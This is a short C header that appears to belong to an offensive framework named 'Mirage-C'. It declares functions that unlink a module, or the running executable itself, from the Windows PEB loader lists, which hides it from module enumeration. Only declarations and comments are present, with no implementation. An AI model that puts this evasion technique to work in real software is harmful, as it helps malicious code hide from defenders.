/*
 * peb_hide.h — PEB module hiding for Mirage-C
 *
 * Unlinks a module from PEB->Ldr InLoadOrder, InMemoryOrder,
 * and InInitializationOrder linked lists, making it invisible
 * to module enumeration (list-modules, LDR walker).
 */

#ifndef MIRAGE_PEB_HIDE_H
#define MIRAGE_PEB_HIDE_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * mirage_unlink_module — Unlink a module from PEB LDR lists.
 *
 * Walks InLoadOrderModuleList looking for a module whose DllBase
 * matches target_base. When found, unlinks it from all three
 * LDR linked lists (InLoadOrder, InMemoryOrder, InInitializationOrder).
 *
 * Returns 1 if the module was found and unlinked, 0 otherwise.
 */
int mirage_unlink_module(void* target_base);

/*
 * mirage_hide_self — Unlink the current module from PEB LDR.
 *
 * Uses the process image base address (PEB->ImageBaseAddress)
 * to unlink the current executable from module lists.
 *
 * Returns 1 on success, 0 on failure.
 */
int mirage_hide_self(void);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_PEB_HIDE_H */
